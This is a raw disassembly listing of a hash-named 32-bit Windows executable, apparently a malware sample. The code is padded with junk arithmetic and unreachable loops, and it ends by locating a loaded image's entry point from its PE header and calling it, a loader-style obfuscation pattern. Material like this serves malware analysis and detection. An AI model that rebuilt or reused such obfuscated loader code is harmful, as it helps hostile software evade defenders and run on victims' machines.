
739d4f87e65706fbba2e6a9a539f548273855a4e1e6a3d1972a65e8d5b381f91.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x108
  401009:	push   esi
  40100a:	lea    eax,[ebp-0xc4]
  401010:	push   eax
  401011:	add    DWORD PTR ds:0x435000,0x438000
  40101b:	push   0xf
  40101d:	sub    DWORD PTR ds:0x43701c,0x435018
  401027:	call   DWORD PTR ds:0x43a8d8
  40102d:	xor    DWORD PTR ds:0x434020,0x437010
  401037:	push   0x43a3e4
  40103c:	inc    DWORD PTR ds:0x435010
  401042:	xor    esi,esi
  401044:	inc    esi
  401045:	mov    DWORD PTR ds:0x434000,0x5c4e
  40104f:	push   esi
  401050:	dec    DWORD PTR ds:0x43401c
  401056:	push   esi
  401057:	and    DWORD PTR ds:0x438004,0x43501c
  401061:	call   DWORD PTR ds:0x43a8ec
  401067:	xor    DWORD PTR ds:0x438000,0x435010
  401071:	test   eax,eax
  401073:	mov    DWORD PTR ds:0x436018,0x4ead
  40107d:	je     0x401094
  401083:	xor    eax,eax
  401085:	mov    DWORD PTR ds:0x435008,0x2c45
  40108f:	jmp    0x40258f
  401094:	push   ebx
  401095:	xor    DWORD PTR ds:0x435008,ecx
  40109b:	mov    ebx,DWORD PTR ds:0x43a8cc
  4010a1:	inc    DWORD PTR ds:0x434004
  4010a7:	push   0x9
  4010a9:	add    DWORD PTR ds:0x434024,0x434008
  4010b3:	push   0x43a3fc
  4010b8:	call   ebx
  4010ba:	and    DWORD PTR ds:0x43800c,0x434000
  4010c4:	test   eax,eax
  4010c6:	je     0x4010ef
  4010cc:	sbb    DWORD PTR ds:0x435010,0x438014
  4010d6:	lea    eax,[ebp-0x20]
  4010d9:	push   eax
  4010da:	or     DWORD PTR ds:0x43601c,0x436010
  4010e4:	call   DWORD PTR ds:0x43a8bc
  4010ea:	jmp    0x40258e
  4010ef:	push   edi
  4010f0:	inc    edi
  4010f1:	mov    edi,DWORD PTR ds:0x43a8fc
  4010f7:	push   0x43a418
  4010fc:	adc    DWORD PTR ds:0x43401c,0x6c9b
  401106:	push   esi
  401107:	push   esi
  401108:	or     DWORD PTR ds:0x434018,0x43401c
  401112:	call   edi
  401114:	and    DWORD PTR ds:0x436004,0x434004
  40111e:	test   eax,eax
  401120:	mov    DWORD PTR ds:0x436000,0x329d
  40112a:	jne    0x40241c
  401130:	mov    esi,DWORD PTR ds:0x43a908
  401136:	or     DWORD PTR ds:0x436000,0x434018
  401140:	push   0xd
  401142:	sbb    DWORD PTR ds:0x435000,0x435010
  40114c:	push   0x43a428
  401151:	adc    DWORD PTR ds:0x43601c,0x44f1
  40115b:	call   esi
  40115d:	test   eax,eax
  40115f:	mov    DWORD PTR ds:0x43801c,0x3c7b
  401169:	je     0x401230
  40116f:	or     DWORD PTR ds:0x434028,0x4ff1
  401179:	push   0x43a43c
  40117e:	xor    DWORD PTR ds:0x434004,0x7bc9
  401188:	push   0x1
  40118a:	push   0x1
  40118c:	sub    DWORD PTR ds:0x435014,0x4cb8
  401196:	call   DWORD PTR ds:0x43a8ec
  40119c:	adc    DWORD PTR ds:0x43600c,0x5c72
  4011a6:	test   eax,eax
  4011a8:	jne    0x402440
  4011ae:	push   0x9
  4011b0:	push   0x43a454
  4011b5:	call   ebx
  4011b7:	xor    DWORD PTR ds:0x434020,0x434004
  4011c1:	test   eax,eax
  4011c3:	mov    DWORD PTR ds:0x43501c,0x26a9
  4011cd:	jne    0x40241c
  4011d3:	add    DWORD PTR ds:0x43400c,0x437000
  4011dd:	push   0x43a470
  4011e2:	or     DWORD PTR ds:0x436004,0x437018
  4011ec:	push   0x1
  4011ee:	push   0x1
  4011f0:	call   edi
  4011f2:	xor    DWORD PTR ds:0x43501c,0xa21
  4011fc:	test   eax,eax
  4011fe:	jne    0x40241c
  401204:	and    DWORD PTR ds:0x435014,0x437004
  40120e:	push   0xd
  401210:	push   0x43a480
  401215:	sbb    DWORD PTR ds:0x436010,0x7182
  40121f:	call   esi
  401221:	mov    DWORD PTR ds:0x436004,0x55a5
  40122b:	jmp    0x402440
  401230:	mov    DWORD PTR [ebp-0x10],0x0
  401237:	add    DWORD PTR ds:0x436008,ecx
  40123d:	mov    eax,DWORD PTR [ebp-0x3c]
  401240:	mov    DWORD PTR [ebp-0x3c],eax
  401243:	mov    DWORD PTR [ebp-0x8],0xf89c8585
  40124a:	add    DWORD PTR ds:0x43700c,0x15f
  401254:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  40125b:	lea    eax,[ebp-0x44]
  40125e:	mov    edi,DWORD PTR ds:0x416574
  401264:	mov    ecx,DWORD PTR ds:0x416578
  40126a:	sub    edi,ecx
  40126c:	sub    edi,DWORD PTR [edi+ecx*1]
  40126f:	mov    DWORD PTR [ebp-0x38],eax
  401272:	xor    DWORD PTR ds:0x43500c,ecx
  401278:	lea    eax,[ebp-0x48]
  40127b:	mov    DWORD PTR [ebp-0x18],eax
  40127e:	xor    edi,edi
  401280:	add    edi,DWORD PTR ds:0x434008
  401286:	xor    DWORD PTR ds:0x435014,edi
  40128c:	mov    eax,ds:0x43a2d4
  401291:	mov    eax,DWORD PTR [eax+0x1c8]
  401297:	movzx  esi,BYTE PTR ds:0x43501c
  40129e:	or     esi,DWORD PTR ds:0x437004
  4012a4:	mov    DWORD PTR ds:0x43501c,esi
  4012aa:	mov    eax,DWORD PTR [eax]
  4012ac:	mov    ecx,DWORD PTR [ebp-0x18]
  4012af:	mov    esi,0x751089b
  4012b4:	add    DWORD PTR ds:0x438008,0x58e0
  4012be:	xor    eax,esi
  4012c0:	xor    DWORD PTR ds:0x434008,edi
  4012c6:	mov    edi,0x3272e2
  4012cb:	and    DWORD PTR ds:0x434000,0x437010
  4012d5:	add    eax,edi
  4012d7:	mov    DWORD PTR [ecx],eax
  4012d9:	mov    eax,ds:0x43a724
  4012de:	cmp    eax,0x312bc9f6
  4012e3:	jne    0x401370
  4012e9:	sbb    DWORD PTR ds:0x436010,0x463c
  4012f3:	mov    eax,DWORD PTR [ebp-0x8]
  4012f6:	mov    ecx,DWORD PTR ds:0x43a2d4
  4012fc:	inc    ebx
  4012fd:	mov    ecx,DWORD PTR [ecx+0x198]
  401303:	xor    eax,esi
  401305:	add    DWORD PTR ds:0x43701c,0x3b79
  40130f:	add    eax,edi
  401311:	mov    DWORD PTR [ecx],eax
  401313:	neg    DWORD PTR ds:0x436008
  401319:	mov    eax,DWORD PTR [ebp-0x8]
  40131c:	xor    eax,esi
  40131e:	and    DWORD PTR ds:0x437008,0x0
  401328:	jmp    0x40133a
  40132d:	mov    ebx,DWORD PTR ds:0x437008
  401333:	inc    ebx
  401334:	mov    DWORD PTR ds:0x437008,ebx
  40133a:	cmp    DWORD PTR ds:0x437008,0x12
  401341:	jae    0x401369
  401347:	cmp    DWORD PTR ds:0x437008,0x17
  40134e:	jg     0x401369
  401354:	jmp    0x401364
  401359:	push   0x426b
  40135e:	call   DWORD PTR ds:0x43a8c4
  401364:	jmp    0x40132d
  401369:	add    eax,edi
  40136b:	mov    ds:0x43a724,eax
  401370:	mov    eax,ds:0x43a2d4
  401375:	add    ebx,0x1d59
  40137b:	mov    eax,DWORD PTR [eax+0x18c]
  401381:	mov    eax,DWORD PTR [eax]
  401383:	mov    ebx,DWORD PTR ds:0x416538
  401389:	mov    ebx,DWORD PTR [ebx]
  40138b:	and    DWORD PTR ds:0x436004,ebx
  401391:	mov    DWORD PTR [ebp-0x7c],eax
  401394:	mov    eax,ds:0x416530
  401399:	mov    ebx,DWORD PTR ds:0x4165b8
  40139f:	sub    eax,ebx
  4013a1:	sub    eax,DWORD PTR [eax+ebx*1]
  4013a4:	mov    eax,0xf89c85b9
  4013a9:	mov    DWORD PTR [ebp-0x10],eax
  4013ac:	sbb    DWORD PTR ds:0x43500c,ebx
  4013b2:	mov    DWORD PTR [ebp-0x10],eax
  4013b5:	adc    DWORD PTR ds:0x436008,edx
  4013bb:	mov    DWORD PTR [ebp-0x10],eax
  4013be:	mov    DWORD PTR ds:0x434000,0x12
  4013c8:	cmp    DWORD PTR ds:0x434000,0x0
  4013cf:	je     0x401402
  4013d5:	cmp    DWORD PTR ds:0x434000,0x17
  4013dc:	jg     0x401402
  4013e2:	jmp    0x4013f0
  4013e7:	push   DWORD PTR [ebp-0x14]
  4013ea:	call   DWORD PTR ds:0x43a8c8
  4013f0:	mov    ebx,DWORD PTR ds:0x434000
  4013f6:	dec    ebx
  4013f7:	mov    DWORD PTR ds:0x434000,ebx
  4013fd:	jmp    0x4013c8
  401402:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  401409:	and    DWORD PTR ds:0x436004,0x0
  401413:	jmp    0x401425
  401418:	mov    ebx,DWORD PTR ds:0x436004
  40141e:	inc    ebx
  40141f:	mov    DWORD PTR ds:0x436004,ebx
  401425:	cmp    DWORD PTR ds:0x436004,0x15
  40142c:	jae    0x401454
  401432:	cmp    DWORD PTR ds:0x436004,0x1c
  401439:	ja     0x401454
  40143f:	jmp    0x40144f
  401444:	push   0x43a097
  401449:	call   DWORD PTR ds:0x43a8d0
  40144f:	jmp    0x401418
  401454:	mov    DWORD PTR [ebp-0x10],eax
  401457:	adc    ebx,0x4a4f
  40145d:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  401464:	movzx  ebx,WORD PTR ds:0x434000
  40146b:	xor    ebx,DWORD PTR ds:0x438000
  401471:	mov    DWORD PTR ds:0x434000,ebx
  401477:	mov    ebx,DWORD PTR [ebp-0x8]
  40147a:	xor    ebx,esi
  40147c:	or     DWORD PTR ds:0x436000,0x43801c
  401486:	add    ebx,edi
  401488:	mov    DWORD PTR ds:0x434004,0x16bd
  401492:	jmp    0x401599
  401497:	adc    eax,DWORD PTR ds:0x437010
  40149d:	mov    eax,DWORD PTR [ebp-0xc]
  4014a0:	add    DWORD PTR ds:0x43600c,0x435004
  4014aa:	xor    eax,esi
  4014ac:	sub    DWORD PTR ds:0x434024,0x438008
  4014b6:	lea    eax,[eax+ebx*1+0x3272e2]
  4014bd:	or     DWORD PTR ds:0x43401c,0x36
  4014c7:	push   eax
  4014c8:	neg    DWORD PTR ds:0x43401c
  4014ce:	mov    eax,DWORD PTR [ebp-0x18]
  4014d1:	xor    eax,esi
  4014d3:	adc    DWORD PTR ds:0x437004,0x7bd1
  4014dd:	lea    eax,[ebp+eax*1+0x3272ea]
  4014e4:	or     DWORD PTR ds:0x434028,0x5a2b
  4014ee:	push   eax
  4014ef:	and    DWORD PTR ds:0x435010,0x0
  4014f9:	jmp    0x401509
  4014fe:	mov    eax,ds:0x435010
  401503:	inc    eax
  401504:	mov    ds:0x435010,eax
  401509:	cmp    DWORD PTR ds:0x435010,0x1b
  401510:	jae    0x401550
  401516:	cmp    DWORD PTR ds:0x435010,0x8
  40151d:	jl     0x401550
  401523:	jmp    0x401533
  401528:	push   0x43a111
  40152d:	call   DWORD PTR ds:0x43a8d4
  401533:	cmp    DWORD PTR ds:0x435010,0x7
  40153a:	jne    0x40154b
  401540:	mov    eax,ds:0x435010
  401545:	inc    eax
  401546:	mov    ds:0x435010,eax
  40154b:	jmp    0x4014fe
  401550:	mov    eax,ds:0x43a2d4
  401555:	sub    DWORD PTR ds:0x438000,0x71a4
  40155f:	push   DWORD PTR [eax+0x1bc]
  401565:	adc    DWORD PTR ds:0x436008,0x7f70
  40156f:	call   0x402598
  401574:	movzx  ecx,BYTE PTR ds:0x434020
  40157b:	sbb    DWORD PTR ds:0x434008,ecx
  401581:	mov    eax,DWORD PTR [ebp-0xc]
  401584:	adc    ecx,DWORD PTR ds:0x438018
  40158a:	xor    eax,esi
  40158c:	sbb    ecx,DWORD PTR ds:0x437000
  401592:	lea    ebx,[ebx+eax*1+0x3272e2]
  401599:	mov    ecx,DWORD PTR ds:0x434018
  40159f:	add    DWORD PTR ds:0x436000,ecx
  4015a5:	mov    eax,DWORD PTR [ebp-0xc]
  4015a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4015ab:	adc    DWORD PTR ds:0x43801c,0x43400c
  4015b5:	xor    ecx,esi
  4015b7:	xor    DWORD PTR ds:0x43800c,0x6ae7
  4015c1:	xor    eax,esi
  4015c3:	add    eax,ecx
  4015c5:	xor    ecx,0x639d
  4015cb:	mov    ecx,DWORD PTR [ebp-0xc]
  4015ce:	sbb    DWORD PTR ds:0x437004,0x435008
  4015d8:	xor    ecx,esi
  4015da:	lea    eax,[eax+ecx*1+0x9758a6]
  4015e1:	mov    DWORD PTR ds:0x437018,0x6f5b
  4015eb:	cmp    ebx,eax
  4015ed:	jbe    0x401497
  4015f3:	mov    eax,DWORD PTR [ebp+0xc]
  4015f6:	and    DWORD PTR ds:0x43601c,ebx
  4015fc:	mov    ds:0x43a158,eax
  401601:	mov    eax,DWORD PTR [ebp+0x10]
  401604:	mov    DWORD PTR ds:0x435004,0xee9
  40160e:	mov    ds:0x43a3ac,eax
  401613:	sbb    DWORD PTR ds:0x436000,ebx
  401619:	mov    eax,ds:0x43a158
  40161e:	neg    ecx
  401620:	mov    ecx,DWORD PTR [ebp-0x38]
  401623:	sub    eax,edi
  401625:	xor    eax,esi
  401627:	mov    DWORD PTR ds:0x438010,0x5a04
  401631:	mov    DWORD PTR [ecx],eax
  401633:	mov    DWORD PTR ds:0x438010,ecx
  401639:	mov    eax,DWORD PTR [ebp-0x3c]
  40163c:	mov    DWORD PTR ds:0x43701c,0x1a94
  401646:	cmp    eax,0xf89c8585
  40164b:	mov    DWORD PTR ds:0x43501c,0x7d63
  401655:	jne    0x401b36
  40165b:	or     DWORD PTR ds:0x43400c,0x43501c
  401665:	push   0x43a494
  40166a:	xor    ebx,ebx
  40166c:	mov    DWORD PTR ds:0x43700c,0x6301
  401676:	inc    ebx
  401677:	and    DWORD PTR ds:0x437014,0x438000
  401681:	push   ebx
  401682:	push   ebx
  401683:	adc    DWORD PTR ds:0x436010,0x6629
  40168d:	call   DWORD PTR ds:0x43a8ec
  401693:	or     DWORD PTR ds:0x435008,0x107f
  40169d:	test   eax,eax
  40169f:	jne    0x402440
  4016a5:	xor    DWORD PTR ds:0x434014,0x437000
  4016af:	push   0x9
  4016b1:	push   0x43a4ac
  4016b6:	xor    DWORD PTR ds:0x43701c,0x434028
  4016c0:	call   DWORD PTR ds:0x43a8cc
  4016c6:	test   eax,eax
  4016c8:	jne    0x40241c
  4016ce:	adc    DWORD PTR ds:0x438010,0x6458
  4016d8:	push   0x43a4c8
  4016dd:	push   ebx
  4016de:	push   ebx
  4016df:	call   DWORD PTR ds:0x43a8fc
  4016e5:	test   eax,eax
  4016e7:	mov    DWORD PTR ds:0x434014,0x6a9b
  4016f1:	jne    0x40241c
  4016f7:	add    DWORD PTR ds:0x434018,0x437004
  401701:	push   0xd
  401703:	neg    DWORD PTR ds:0x438004
  401709:	push   0x43a4d8
  40170e:	and    DWORD PTR ds:0x435010,0x62ab
  401718:	call   DWORD PTR ds:0x43a908
  40171e:	or     DWORD PTR ds:0x435008,0x43600c
  401728:	test   eax,eax
  40172a:	jne    0x402440
  401730:	sbb    DWORD PTR ds:0x436010,0x438018
  40173a:	lea    eax,[ebp-0x34]
  40173d:	sub    DWORD PTR ds:0x43500c,0x6999
  401747:	mov    DWORD PTR [ebp-0x9c],eax
  40174d:	lea    eax,[ebp+0x4]
  401750:	or     DWORD PTR ds:0x43700c,0x43601c
  40175a:	mov    DWORD PTR [ebp-0x34],eax
  40175d:	xor    eax,DWORD PTR ds:0x43600c
  401763:	mov    eax,DWORD PTR [ebp-0x34]
  401766:	and    DWORD PTR ds:0x43401c,0x436018
  401770:	test   eax,eax
  401772:	je     0x402572
  401778:	xor    eax,ecx
  40177a:	mov    eax,DWORD PTR [ebp-0x28]
  40177d:	mov    eax,DWORD PTR [ebp-0xc]
  401780:	xor    DWORD PTR ds:0x434008,0x3c87
  40178a:	mov    eax,DWORD PTR [ebp-0x8]
  40178d:	and    DWORD PTR ds:0x434008,0x0
  401797:	xor    ecx,ecx
  401799:	add    ecx,DWORD PTR ds:0x434008
  40179f:	inc    ecx
  4017a0:	mov    DWORD PTR ds:0x434008,ecx
  4017a6:	cmp    DWORD PTR ds:0x434008,0x23
  4017ad:	jbe    0x4017ce
  4017b3:	jmp    0x4017c1
  4017b8:	push   DWORD PTR [ebp-0x20]
  4017bb:	call   DWORD PTR ds:0x43a8dc
  4017c1:	cmp    DWORD PTR ds:0x434008,0x15
  4017c8:	jb     0x401797
  4017ce:	mov    DWORD PTR [ebp+0xc],eax
  4017d1:	mov    DWORD PTR ds:0x43400c,0x1d
  4017db:	cmp    DWORD PTR ds:0x43400c,0x0
  4017e2:	je     0x40183c
  4017e8:	cmp    DWORD PTR ds:0x43400c,0x3
  4017ef:	ja     0x40183c
  4017f5:	jmp    0x40180e
  4017fa:	push   0x43a0c9
  4017ff:	push   DWORD PTR [ebp-0x18]
  401802:	push   DWORD PTR [ebp-0x28]
  401805:	push   DWORD PTR [ebp-0x1c]
  401808:	call   DWORD PTR ds:0x43a8e0
  40180e:	cmp    DWORD PTR ds:0x43400c,0x4
  401815:	jne    0x40182a
  40181b:	xor    ecx,ecx
  40181d:	add    ecx,DWORD PTR ds:0x43400c
  401823:	dec    ecx
  401824:	mov    DWORD PTR ds:0x43400c,ecx
  40182a:	mov    ecx,DWORD PTR ds:0x43400c
  401830:	dec    ecx
  401831:	mov    DWORD PTR ds:0x43400c,ecx
  401837:	jmp    0x4017db
  40183c:	mov    eax,eax
  40183e:	and    DWORD PTR ds:0x43401c,0x0
  401848:	jmp    0x40185c
  40184d:	xor    ecx,ecx
  40184f:	add    ecx,DWORD PTR ds:0x43401c
  401855:	inc    ecx
  401856:	mov    DWORD PTR ds:0x43401c,ecx
  40185c:	cmp    DWORD PTR ds:0x43401c,0x14
  401863:	jae    0x4018b6
  401869:	cmp    DWORD PTR ds:0x43401c,0x9
  401870:	jge    0x4018b6
  401876:	jmp    0x401897
  40187b:	push   DWORD PTR [ebp-0x14]
  40187e:	push   0x434004
  401883:	push   DWORD PTR [ebp-0x24]
  401886:	push   0x43a07b
  40188b:	push   DWORD PTR [ebp-0x20]
  40188e:	push   DWORD PTR [ebp-0x18]
  401891:	call   DWORD PTR ds:0x43a8e4
  401897:	cmp    DWORD PTR ds:0x43401c,0x8
  40189e:	jne    0x4018b1
  4018a4:	mov    ecx,DWORD PTR ds:0x43401c
  4018aa:	inc    ecx
  4018ab:	mov    DWORD PTR ds:0x43401c,ecx
  4018b1:	jmp    0x40184d
  4018b6:	mov    eax,ds:0x43a2d4
  4018bb:	or     DWORD PTR ds:0x434008,0x6b78
  4018c5:	mov    eax,DWORD PTR [eax+0x1c8]
  4018cb:	mov    eax,DWORD PTR [eax]
  4018cd:	mov    DWORD PTR ds:0x43400c,0x1f
  4018d7:	cmp    DWORD PTR ds:0x43400c,0x0
  4018de:	je     0x40191e
  4018e4:	cmp    DWORD PTR ds:0x43400c,0x21
  4018eb:	jbe    0x40191e
  4018f1:	jmp    0x40190a
  4018f6:	push   0x1259
  4018fb:	push   DWORD PTR [ebp-0x10]
  4018fe:	push   DWORD PTR [ebp-0x28]
  401901:	push   DWORD PTR [ebp-0xc]
  401904:	call   DWORD PTR ds:0x43a8e8
  40190a:	xor    ecx,ecx
  40190c:	xor    ecx,DWORD PTR ds:0x43400c
  401912:	dec    ecx
  401913:	mov    DWORD PTR ds:0x43400c,ecx
  401919:	jmp    0x4018d7
  40191e:	cdq    
  40191f:	mov    ebx,eax
  401921:	mov    DWORD PTR ds:0x435000,0x1d
  40192b:	cmp    DWORD PTR ds:0x435000,0x0
  401932:	je     0x401964
  401938:	cmp    DWORD PTR ds:0x435000,0x28
  40193f:	ja     0x401964
  401945:	jmp    0x401950
  40194a:	call   DWORD PTR ds:0x43a8f0
  401950:	xor    ecx,ecx
  401952:	add    ecx,DWORD PTR ds:0x435000
  401958:	dec    ecx
  401959:	mov    DWORD PTR ds:0x435000,ecx
  40195f:	jmp    0x40192b
  401964:	mov    eax,0xfabdbee7
  401969:	add    ebx,eax
  40196b:	mov    DWORD PTR ds:0x43501c,ebx
  401971:	adc    edx,0xffffffff
  401974:	and    ecx,DWORD PTR ds:0x434018
  40197a:	and    DWORD PTR [ebp-0x10],0x0
  40197e:	xor    edx,0x0
  401981:	mov    DWORD PTR [ebp-0x6c],edx
  401984:	mov    edx,DWORD PTR [ebp+0xc]
  401987:	mov    DWORD PTR [ebp-0x14],edx
  40198a:	and    ecx,edx
  40198c:	mov    ecx,0x8a29a12d
  401991:	and    DWORD PTR ds:0x437018,0x6956
  40199b:	xor    ebx,ecx
  40199d:	add    DWORD PTR [ebp-0x14],eax
  4019a0:	mov    edx,DWORD PTR [ebp-0x14]
  4019a3:	mov    DWORD PTR ds:0x437018,0xe51
  4019ad:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4019b1:	adc    DWORD PTR ds:0x43401c,0x434014
  4019bb:	xor    edx,ecx
  4019bd:	sub    DWORD PTR ds:0x438018,0x437000
  4019c7:	mov    DWORD PTR [ebp-0x5c],edx
  4019ca:	mov    edx,DWORD PTR [ebp-0x10]
  4019cd:	xor    edx,0x0
  4019d0:	mov    DWORD PTR [ebp-0x58],edx
  4019d3:	mov    DWORD PTR ds:0x43600c,0x7e33
  4019dd:	cmp    DWORD PTR [ebp-0x5c],ebx
  4019e0:	mov    DWORD PTR ds:0x434010,0x71c9
  4019ea:	jne    0x401a0c
  4019f0:	mov    edx,DWORD PTR ds:0x434004
  4019f6:	mov    edx,DWORD PTR [ebp-0x6c]
  4019f9:	cmp    DWORD PTR [ebp-0x58],edx
  4019fc:	mov    DWORD PTR ds:0x43600c,0x7cc1
  401a06:	je     0x401aa7
  401a0c:	mov    DWORD PTR ds:0x434018,0x1c
  401a16:	cmp    DWORD PTR ds:0x434018,0x0
  401a1d:	je     0x401a50
  401a23:	cmp    DWORD PTR ds:0x434018,0x29
  401a2a:	jbe    0x401a50
  401a30:	jmp    0x401a3e
  401a35:	push   DWORD PTR [ebp-0x28]
  401a38:	call   DWORD PTR ds:0x43a8f4
  401a3e:	mov    edx,DWORD PTR ds:0x434018
  401a44:	dec    edx
  401a45:	mov    DWORD PTR ds:0x434018,edx
  401a4b:	jmp    0x401a16
  401a50:	mov    edx,DWORD PTR ds:0x43a2d4
  401a56:	or     DWORD PTR ds:0x436018,0x438010
  401a60:	mov    edx,DWORD PTR [edx+0x1c0]
  401a66:	add    DWORD PTR ds:0x434018,0x436004
  401a70:	mov    edx,DWORD PTR [edx]
  401a72:	xor    ebx,ebx
  401a74:	add    edx,eax
  401a76:	adc    ebx,0xffffffff
  401a79:	xor    edx,ecx
  401a7b:	xor    ebx,0x0
  401a7e:	cmp    edx,0x70941fc5
  401a84:	mov    DWORD PTR ds:0x438014,0x6222
  401a8e:	jne    0x402572
  401a94:	cmp    ebx,0xffffffff
  401a97:	mov    DWORD PTR ds:0x436010,0x168c
  401aa1:	jne    0x402572
  401aa7:	mov    edx,DWORD PTR ds:0x43a350
  401aad:	or     DWORD PTR ds:0x43501c,0x338f
  401ab7:	mov    ebx,DWORD PTR ds:0x43a358
  401abd:	sbb    DWORD PTR ds:0x43501c,0x434008
  401ac7:	xor    edx,ebx
  401ac9:	and    DWORD PTR ds:0x438000,0x0
  401ad3:	jmp    0x401ae5
  401ad8:	mov    ebx,DWORD PTR ds:0x438000
  401ade:	inc    ebx
  401adf:	mov    DWORD PTR ds:0x438000,ebx
  401ae5:	cmp    DWORD PTR ds:0x438000,0x1a
  401aec:	jae    0x401b17
  401af2:	cmp    DWORD PTR ds:0x438000,0x29
  401af9:	jl     0x401b17
  401aff:	jmp    0x401b12
  401b04:	push   0x4320
  401b09:	push   DWORD PTR [ebp-0x28]
  401b0c:	call   DWORD PTR ds:0x43a8f8
  401b12:	jmp    0x401ad8
  401b17:	mov    DWORD PTR ds:0x43a350,edx
  401b1d:	mov    edx,DWORD PTR [ebp-0x34]
  401b20:	mov    ebx,DWORD PTR ds:0x43a350
  401b26:	add    ebx,DWORD PTR [edx]
  401b28:	not    DWORD PTR ds:0x43801c
  401b2e:	mov    edx,DWORD PTR [ebp-0x34]
  401b31:	jmp    0x402531
  401b36:	mov    eax,DWORD PTR [ebp-0x44]
  401b39:	mov    DWORD PTR ds:0x436000,0x3783
  401b43:	cmp    eax,0xf89c8584
  401b48:	mov    DWORD PTR ds:0x434000,0x66dd
  401b52:	je     0x401d61
  401b58:	xor    eax,eax
  401b5a:	xor    eax,DWORD PTR ds:0x434018
  401b60:	adc    eax,DWORD PTR ds:0x434024
  401b66:	mov    ds:0x434018,eax
  401b6b:	mov    eax,DWORD PTR [ebp-0x8]
  401b6e:	mov    ecx,DWORD PTR [ebp-0x48]
  401b71:	xor    eax,esi
  401b73:	add    eax,edi
  401b75:	mov    DWORD PTR ds:0x436004,0x39e8
  401b7f:	cmp    eax,ecx
  401b81:	mov    DWORD PTR ds:0x434018,0x5d7a
  401b8b:	je     0x401d61
  401b91:	xor    DWORD PTR ds:0x434000,0x3742
  401b9b:	push   0x43a5f4
  401ba0:	xor    esi,esi
  401ba2:	inc    esi
  401ba3:	sbb    DWORD PTR ds:0x43801c,0x434008
  401bad:	push   esi
  401bae:	sub    DWORD PTR ds:0x43701c,0x437018
  401bb8:	push   esi
  401bb9:	adc    DWORD PTR ds:0x436004,0x30fb
  401bc3:	call   DWORD PTR ds:0x43a8ec
  401bc9:	or     DWORD PTR ds:0x435000,0x43400c
  401bd3:	test   eax,eax
  401bd5:	mov    DWORD PTR ds:0x437010,0x752e
  401bdf:	jne    0x402440
  401be5:	mov    DWORD PTR ds:0x43501c,0xd2c
  401bef:	push   0x9
  401bf1:	add    DWORD PTR ds:0x43500c,0x3ba4
  401bfb:	push   0x43a60c
  401c00:	call   DWORD PTR ds:0x43a8cc
  401c06:	test   eax,eax
  401c08:	jne    0x40241c
  401c0e:	and    DWORD PTR ds:0x43401c,0x438010
  401c18:	push   0x43a628
  401c1d:	push   esi
  401c1e:	push   esi
  401c1f:	sbb    DWORD PTR ds:0x436000,0x437014
  401c29:	call   DWORD PTR ds:0x43a8fc
  401c2f:	or     DWORD PTR ds:0x43400c,0x434020
  401c39:	test   eax,eax
  401c3b:	mov    DWORD PTR ds:0x438018,0x4ca0
  401c45:	jne    0x40241c
  401c4b:	push   0xd
  401c4d:	add    DWORD PTR ds:0x437000,0x43400c
  401c57:	push   0x43a638
  401c5c:	call   DWORD PTR ds:0x43a908
  401c62:	add    DWORD PTR ds:0x437018,0x7176
  401c6c:	test   eax,eax
  401c6e:	jne    0x402440
  401c74:	mov    DWORD PTR ds:0x436000,0x1e
  401c7e:	cmp    DWORD PTR ds:0x436000,0x0
  401c85:	je     0x401cd4
  401c8b:	cmp    DWORD PTR ds:0x436000,0x10
  401c92:	jle    0x401cd4
  401c98:	jmp    0x401ca8
  401c9d:	push   0x435014
  401ca2:	call   DWORD PTR ds:0x43a900
  401ca8:	cmp    DWORD PTR ds:0x436000,0x11
  401caf:	jne    0x401cc2
  401cb5:	mov    ecx,DWORD PTR ds:0x436000
  401cbb:	dec    ecx
  401cbc:	mov    DWORD PTR ds:0x436000,ecx
  401cc2:	mov    ecx,DWORD PTR ds:0x436000
  401cc8:	dec    ecx
  401cc9:	mov    DWORD PTR ds:0x436000,ecx
  401ccf:	jmp    0x401c7e
  401cd4:	mov    eax,ds:0x43a2d4
  401cd9:	mov    ecx,DWORD PTR ds:0x435004
  401cdf:	or     DWORD PTR ds:0x438010,ecx
  401ce5:	mov    eax,DWORD PTR [eax+0x194]
  401ceb:	mov    ecx,DWORD PTR [eax]
  401ced:	mov    eax,DWORD PTR [ecx+0x3c]
  401cf0:	push   DWORD PTR ds:0x43a3ac
  401cf6:	mov    DWORD PTR ds:0x435014,0x6873
  401d00:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401d04:	push   DWORD PTR ds:0x43a158
  401d0a:	mov    DWORD PTR ds:0x43400c,0x7a94
  401d14:	add    eax,ecx
  401d16:	mov    ecx,DWORD PTR ds:0x43a2d4
  401d1c:	or     DWORD PTR ds:0x437010,0x5a23
  401d26:	mov    ecx,DWORD PTR [ecx+0x194]
  401d2c:	mov    DWORD PTR ds:0x436008,0x65e8
  401d36:	push   DWORD PTR [ecx]
  401d38:	sbb    DWORD PTR ds:0x43401c,0x5228
  401d42:	call   eax
  401d44:	mov    ecx,DWORD PTR ds:0x43a2d4
  401d4a:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401d50:	mov    DWORD PTR ds:0x437014,0xc7a
  401d5a:	mov    DWORD PTR [ecx],eax
  401d5c:	jmp    0x402572
  401d61:	adc    DWORD PTR ds:0x43700c,0x4142
  401d6b:	push   0x43a4ec
  401d70:	adc    DWORD PTR ds:0x435008,0x3813
  401d7a:	xor    ebx,ebx
  401d7c:	sbb    DWORD PTR ds:0x43801c,0x3514
  401d86:	inc    ebx
  401d87:	not    DWORD PTR ds:0x435008
  401d8d:	push   ebx
  401d8e:	push   ebx
  401d8f:	call   DWORD PTR ds:0x43a8ec
  401d95:	or     DWORD PTR ds:0x436010,0x434018
  401d9f:	test   eax,eax
  401da1:	mov    DWORD PTR ds:0x437008,0x71b6
  401dab:	jne    0x402440
  401db1:	or     DWORD PTR ds:0x438010,0x434014
  401dbb:	push   0x9
  401dbd:	add    DWORD PTR ds:0x437008,0x6ead
  401dc7:	push   0x43a504
  401dcc:	add    DWORD PTR ds:0x437010,0x12d1
  401dd6:	call   DWORD PTR ds:0x43a8cc
  401ddc:	add    DWORD PTR ds:0x434014,0x5154
  401de6:	test   eax,eax
  401de8:	mov    DWORD PTR ds:0x43600c,0xb65
  401df2:	jne    0x40241c
